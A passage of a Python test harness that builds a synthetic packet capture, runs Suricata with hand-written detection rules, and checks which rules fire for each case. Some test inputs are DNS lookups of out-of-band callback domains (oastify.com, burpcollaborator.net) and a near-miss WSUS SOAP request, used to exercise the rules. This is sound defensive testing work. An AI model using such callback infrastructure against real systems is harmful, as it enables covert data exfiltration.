    lookup("payload name with a polling. label in front, oastify", [3801057], "polling.x7k2m9p4q1.oastify.com")
    lookup("payload name with a polling. label in front, burpcollaborator", [3801058], "polling.x7k2m9p4q1.burpcollaborator.net")
    http("near miss: wsus service from inside", [], post("/ApiRemoting30/WebService.asmx", "<soap/>", ctype="text/xml"), client="int", port=8530)


def build_pcap(path):
    pkts, clock = [], [1795000000.0]

    def add(p):
        clock[0] += 0.01
        p.time = clock[0]
        pkts.append(p)

    for n, c in enumerate(CASES):
        c["ip"] = f"{'10.1' if c['client'] == 'int' else '198.18'}.{n // 250}.{n % 250 + 1}"
        srv, sport = (INT_SRV if c["server"] == "int" else EXT_SRV), 40000 + n
        out, back = Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02"), Ether(src="02:00:00:00:00:02", dst="02:00:00:00:00:01")
        if c["dns"]:
            add(out / IP(src=c["ip"], dst=RESOLVER) / UDP(sport=sport, dport=53) / DNS(id=n + 1, rd=1, qd=DNSQR(qname=c["dns"])))
            continue
        tcp = lambda **kw: IP(src=c["ip"], dst=srv) / TCP(sport=sport, dport=c["port"], **kw)  # noqa: E731
        rtcp = lambda **kw: IP(src=srv, dst=c["ip"]) / TCP(sport=c["port"], dport=sport, **kw)  # noqa: E731
        cs, ss = 1000, 5000
        add(out / tcp(flags="S", seq=cs))
        add(back / rtcp(flags="SA", seq=ss, ack=cs + 1))
        add(out / tcp(flags="A", seq=cs + 1, ack=ss + 1))
        add(out / tcp(flags="PA", seq=cs + 1, ack=ss + 1) / c["request"])
        cs2 = cs + 1 + len(c["request"])
        ss2 = ss + 1
        if c["response"]:
            add(back / rtcp(flags="PA", seq=ss + 1, ack=cs2) / c["response"])
            ss2 += len(c["response"])
        add(out / tcp(flags="FA", seq=cs2, ack=ss2))
        add(back / rtcp(flags="FA", seq=ss2, ack=cs2 + 1))
        add(out / tcp(flags="A", seq=cs2 + 1, ack=ss2 + 1))
    wrpcap(str(path), pkts)


def main():
    for tool in ("suricata", "openssl"):
        if not shutil.which(tool):
            sys.exit(f"{tool} is not on the PATH")
    work = Path(tempfile.mkdtemp(prefix="td-suricata-"))
    define_cases(work)
    build_pcap(work / "cases.pcap")
    files = sorted(ROOT.glob("*/**/suricata/*.rules"))
    (work / "all.rules").write_text("\n".join(p.read_text(encoding="utf-8") for p in files), encoding="utf-8")
    written = {int(s) for p in files if not p.name.endswith("-ip.rules") for s in re.findall(r"\bsid:(\d+);", p.read_text(encoding="utf-8"))}
    r = subprocess.run(["suricata", "-r", str(work / "cases.pcap"), "-S", str(work / "all.rules"), "-l", str(work), "-k", "none",
                        "--init-errors-fatal", "--set", "vars.address-groups.HOME_NET=[10.0.0.0/8]",
                        # A packaged Suricata service may already hold the command socket; a pcap run does not need one.
                        "--set", "unix-command.enabled=no"], capture_output=True, text=True)
    if r.returncode:
        sys.exit("suricata failed to load the rules or read the pcap:\n" + r.stdout[-3000:] + r.stderr[-3000:])
    fired = {}
    for line in (work / "fast.log").read_text().splitlines():
        m = re.search(r"\[1:(\d+):\d+\].*\} ([\d.]+):\d+ -> ([\d.]+):\d+", line)
        if m:
            for ip in m.group(2, 3):
                fired.setdefault(ip, set()).add(int(m.group(1)))
    failed, seen = 0, set()
    for c in CASES:
        got = sorted(fired.get(c["ip"], set()))
        seen.update(got)
        if got != c["expect"]:
            failed += 1
            print(f"FAIL {c['name']}: expected {c['expect']}, got {got}")
    untested = sorted(written - seen)
    if untested:
        print(f"FAIL rules with no case: {untested}")
    print(f"{len(CASES)} cases, {len(written)} hand-written rules, {len(seen & written)} fired, {failed} failed")
    shutil.rmtree(work, ignore_errors=True)
    if failed or untested:
        sys.exit(1)
    print("PASS")


if __name__ == "__main__":
    main()
